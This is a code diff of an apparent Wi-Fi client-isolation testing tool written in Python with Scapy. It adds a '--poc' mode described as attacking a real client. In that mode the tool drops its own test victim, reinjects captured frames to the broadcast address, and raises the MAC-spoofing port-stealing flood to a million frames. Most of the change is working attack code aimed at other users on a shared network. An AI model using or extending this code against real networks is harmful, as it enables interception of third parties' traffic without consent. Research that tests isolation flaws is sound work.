@@ -738,15 +738,22 @@ class Supplicant(Daemon):
 
 class Client2Client:
 	def __init__(self, options):
-		self.sup_victim = Supplicant(options.iface, options)
-		self.sup_attacker = Supplicant(options.c2c, options)
+		self.options = options
+		self.poc = options.poc
+		if not self.poc:
+			self.sup_victim = Supplicant(options.iface, options)
+			self.sup_attacker = Supplicant(options.c2c, options)
+		else:
+			self.sup_victim = None
+			self.sup_attacker = Supplicant(options.c2c, options)
 		self.forward_ip = False
 		self.forward_ethernet = False
-		self.options = options
 		self.bssid_victim = None
+		
 
 	def stop(self):
-		self.sup_victim.stop()
+		if not self.poc:
+			self.sup_victim.stop()
 		self.sup_attacker.stop()
 
 
@@ -772,8 +779,19 @@ class Client2Client:
 		#	quit(1)
 
 	def monitor_eth_port_steal(self, eth):
-		if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890" :
-			log(STATUS, f">>> Downlink port stealing is successful.", color="red")
+		if not self.options.poc:
+			if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890" :
+				log(STATUS, f">>> Downlink port stealing is successful.", color="red")
+		else:
+			log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
+			self.reinject_frame_via_broadcast_reflection(eth)
+
+	def reinject_frame_via_broadcast_reflection(self, eth):
+		if Ether in eth:
+			pkt = eth.copy()
+			pkt[Ether].dst = "ff:ff:ff:ff:ff:ff"
+			self.sup_attacker.send_eth(pkt)
+			log(STATUS, f">>> Reinjected the frame via broadcast reflection.", color="green")
 
 	def monitor_eth_port_steal_uplink(self, eth):
 		if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"abcdefghijklmn" :
@@ -800,12 +818,13 @@ class Client2Client:
 		# Option three: test port stealing by letting the attacker to send a lot of layer-2 frames with src addr as the victim. 
 		elif self.options.c2c_port_steal is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
-			p = Ether(src=self.sup_attacker.mac, dst=self.bssid_victim, type=0x0800)/Raw(b"port_steal")
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker to gateway/router:       {repr(p)} (Ethernet destination is the gateway/router)")
-			for _ in range(1000):
+			for _ in range(1000000):
 				self.sup_attacker.send_eth(p)
-				time.sleep(0.1)
-			log(STATUS, f"Finished sending 1000 frames.")
+				log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
+				time.sleep(0.05)
+			log(STATUS, f"Finished sending 1000000 frames.")
 
 		# Option four: test port stealing (uplink) by letting the attacker send a lot of layer-2 frames with src addr as the victim's gateway. 
 		elif self.options.c2c_port_steal_uplink is not None:
@@ -866,21 +885,24 @@ class Client2Client:
 		# Start both clients
 		if self.options.c2c_port_steal is not None:
 			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
-		self.sup_victim.start()
+		if not self.options.poc:
+			self.sup_victim.start()
 		self.sup_attacker.start()
-		self.sup_victim.scan(wait=False)
+		if not self.options.poc:
+			self.sup_victim.scan(wait=False)
 		self.sup_attacker.scan(wait=False)
-		self.sup_victim.wait_scan_done()
+		if not self.options.poc:
+			self.sup_victim.wait_scan_done()
 		self.sup_attacker.wait_scan_done()
 
 		# Let both client connects
-		log(STATUS, f"Connecting as {self.sup_victim.id_victim} using {self.sup_victim.nic_iface} to the network...", color="green")
-		self.sup_victim.connect(self.sup_victim.netid_victim, timeout=60)
-		data = self.sup_victim.status()
-		self.bssid_victim = data['bssid']
-
-		# Let the victim get an IP address
-		self.sup_victim.get_ip_address()
+		if not self.options.poc:
+			log(STATUS, f"Connecting as {self.sup_victim.id_victim} using {self.sup_victim.nic_iface} to the network...", color="green")
+			self.sup_victim.connect(self.sup_victim.netid_victim, timeout=60)
+			data = self.sup_victim.status()
+			self.bssid_victim = data['bssid']
+			# Let the victim get an IP address
+			self.sup_victim.get_ip_address()
 
 		if self.options.c2c_port_steal_uplink is not None:
 			set_macaddress(self.options.c2c, self.sup_victim.routermac)
@@ -915,12 +937,13 @@ class Client2Client:
 		else:
 			thread2 = threading.Thread(target=self.start_monitor)
 
-		if self.options.c2c_port_steal is not None:
-			thread3 = threading.Thread(target=self.send_uplink_frame)
-			thread3.start()
-		elif self.options.c2c_port_steal_uplink is not None:
-			thread3 = threading.Thread(target=self.send_uplink_frame2)
-			thread3.start()
+		if not self.options.poc:
+			if self.options.c2c_port_steal is not None:
+				thread3 = threading.Thread(target=self.send_uplink_frame)
+				thread3.start()
+			elif self.options.c2c_port_steal_uplink is not None:
+				thread3 = threading.Thread(target=self.send_uplink_frame2)
+				thread3.start()
 
 		thread2.start()
 		thread1.start()
@@ -929,8 +952,9 @@ class Client2Client:
 
 		thread1.join()
 		thread2.join()
-		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-			thread3.join()
+		if not self.options.poc:
+			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+				thread3.join()
 
 
 		# Identity output to use
@@ -1049,6 +1073,7 @@ def main():
 	parser.add_argument("--c2c-port-steal-uplink", help="Second interface to test port stealing (uplink).")
 	parser.add_argument("--fast", help="Fast override attack using second given interface.")
 	parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
+	parser.add_argument("--poc", default=False, action="store_true", help="Attack a real client for PoC purposes.")
 	options = parser.parse_args()
 
 	# TODO: Implement this by first connecting to the given BSSID to create a cached PMK
